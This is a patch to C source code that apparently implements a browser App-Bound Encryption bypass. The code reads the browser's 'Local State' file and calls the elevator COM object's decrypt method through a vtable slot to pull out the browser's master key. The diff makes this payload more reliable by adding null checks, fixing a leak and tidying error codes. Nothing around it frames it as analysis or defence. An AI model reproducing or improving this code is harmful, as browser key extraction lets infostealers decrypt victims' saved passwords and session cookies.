@@ -30,12 +30,19 @@ AbePrepareRequest(
 
     Str_PrintfExW(LocalState, MAX_PATH, L"%ls\\Local State", Browser->UserDataDir);
     Status = IO_ReadWin32FileToBuffer(LocalState, &Text, &Length);
-    if (!NT_SUCCESS(Status) || Length > sizeof(g_Request.LocalState))
+    if (!NT_SUCCESS(Status))
+    {
+        return FALSE;
+    }
+    if (Length > sizeof(g_Request.LocalState))
     {
         Mem_Free(Text);
         return FALSE;
     }
-    RtlCopyMemory((PVOID)g_Request.LocalState, Text, Length);
+    if (Length != 0)
+    {
+        RtlCopyMemory((PVOID)g_Request.LocalState, Text, Length);
+    }
     Mem_Free(Text);
     g_Request.BrowserType = Browser->Type;
     g_Request.LocalStateLength = Length;
@@ -144,15 +151,21 @@ AbePayloadWorker(VOID)
                     if (SUCCEEDED(Hr))
                     {
                         In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
-                        Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
-                            Elevator,
-                            In,
-                            &Out,
-                            &LastError);
-                        if (SUCCEEDED(Hr) && Out != NULL && SysByteLen(Out) == ABE_KEY_SIZE)
+                        if (In == NULL)
                         {
-                            RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
-                            Code = 0;
+                            Hr = E_OUTOFMEMORY;
+                        } else
+                        {
+                            Hr = ((PFN_IELEVATOR_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
+                                Elevator,
+                                In,
+                                &Out,
+                                &LastError);
+                            if (SUCCEEDED(Hr) && Out != NULL && SysByteLen(Out) == ABE_KEY_SIZE)
+                            {
+                                RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
+                                Code = 0;
+                            }
                         }
                     }
                     ((PFN_IUNKNOWN_RELEASE)((*(PVOID***)Elevator)[2]))(Elevator);
@@ -170,7 +183,7 @@ AbePayloadWorker(VOID)
             SysFree(Out);
         }
     }
-    g_Code = Code != 0 ? (LONG)Hr : 0;
+    g_Code = Code == 0 ? 0 : (LONG)(FAILED(Hr) ? Hr : E_FAIL);
     g_Pending = 1;
 }
 
